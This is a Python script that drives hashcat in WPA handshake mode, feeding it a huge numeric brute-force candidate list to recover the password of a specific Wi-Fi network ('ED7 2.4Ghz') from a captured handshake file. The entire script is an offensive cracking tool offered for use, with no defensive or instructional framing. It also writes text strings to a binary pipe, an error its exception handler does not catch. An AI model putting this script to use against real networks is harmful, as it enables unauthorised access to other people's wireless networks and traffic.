import _thread
import errno
import fcntl
import os
import sys
import time
from subprocess import PIPE
import subprocess
import threading


class PrintingThread(threading.Thread):
    def __init__(self, ssid, name, output, lock, passwdUtility):
        threading.Thread.__init__(self)
        self.name = name
        self.ssid = ssid.lower()
        self.output = output
        self.lock = lock
        self.passwdUtility = passwdUtility

    def run(self):
        print("Starting " + self.name)
        done = False
        self.lock.acquire()
        while not done:

            line = self.output.readline()
            if line != "":
                try:
                    line = line.lower()
                    print(line)
                    if self.ssid in line:
                        done = True
                        self.passwdUtility.found = True
                        self.passwdUtility.password = line
                except:
                    pass
            else:
                done = True

        self.lock.release()


class PasswordUtility(object):
    def __init__(self):
        self.found = False
        self.password = None


passwdUtility = PasswordUtility()
threadLock = threading.Lock()
ssid = 'ED7 2.4Ghz'
lotsOf = list(range(0, 199900000))  # + ["quagliaquaglia"] #+ list(range(0, 199900))
handShakeFile = "./quaglia.hccapx"
hashcat = subprocess.Popen(
    ["hashcat", "-m", "2500", handShakeFile, "--potfile-disable", "--status", "--status-timer", "20", "-w", "3"],
    stdin=PIPE, stdout=PIPE, bufsize=1)

outputThread = PrintingThread(ssid, "CheckOutput", hashcat.stdout, threadLock, passwdUtility)
outputThread.start()

print("PARTO")
for passwd in lotsOf:
    try:
        hashcat.stdin.write(str(passwd) + "\n")
    except IOError as e:
        if e.errno == errno.EPIPE or e.errno == errno.EINVAL:

            print("ERROR :" + str(e))
            # Stop loop on "Invalid pipe" or "Invalid argument".
            # No sense in continuing with broken pipe.
            break
        else:
            # Raise any other error.
            raise
hashcat.stdin.close()

print("FINITO attempting to check Password")
threadLock.acquire()
found = passwdUtility.found

if found:
    print("Password has been found, updating accumulator")
    print(passwdUtility.password)
    # Update accumulator
    # return

print("END")
